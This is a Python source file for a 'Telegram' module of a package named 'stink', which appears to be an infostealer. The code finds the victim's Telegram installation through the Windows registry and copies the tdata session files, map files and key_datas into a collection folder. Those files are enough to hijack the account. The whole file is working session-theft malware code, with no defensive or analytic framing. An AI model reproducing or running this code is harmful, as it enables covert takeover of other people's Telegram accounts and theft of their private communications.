from re import findall
from shutil import copyfile
from os import listdir, path, makedirs
from typing import Optional
from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER

from stink.helpers.config import TelegramConfig


class Telegram:
    """
    Collects sessions from the Telegram.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__full_path = path.join(storage_path, folder)
        self.__config = TelegramConfig()

    def __create_folder(self) -> None:
        """
        Creates storage for the Telegram module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        folder = path.join(self.__full_path, "D877F783D5D3EF8C")

        if not path.exists(folder):
            makedirs(folder)

    def __get_telegram_path(self) -> Optional[str]:
        """
        Gets the Telegram installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Telegram installation path if found.
        """
        if path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")

            for i in range(QueryInfoKey(key)[0]):

                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "Telegram" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            print(f"[Telegram]: {repr(e)}")

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.

        Parameters:
        - None.

        Returns:
        - None.
        """
        telegram_path = self.__get_telegram_path()

        if not telegram_path:
            print(f"[Telegram]: No telegram found")
            return

        telegram_data = path.join(telegram_path, "tdata")
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)], [])

        if not sessions:
            return

        self.__create_folder()

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            copyfile(path.join(telegram_data, session), path.join(self.__full_path, session))

        maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])

        for map in maps:
            copyfile(
                path.join(telegram_data, "D877F783D5D3EF8C", map),
                path.join(self.__full_path, "D877F783D5D3EF8C", map)
            )

        copyfile(path.join(telegram_data, "key_datas"), path.join(self.__full_path, "key_datas"))

    def run(self) -> None:
        """
        Launches the Telegram collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_sessions()

        except Exception as e:
            print(f"[Telegram]: {repr(e)}")
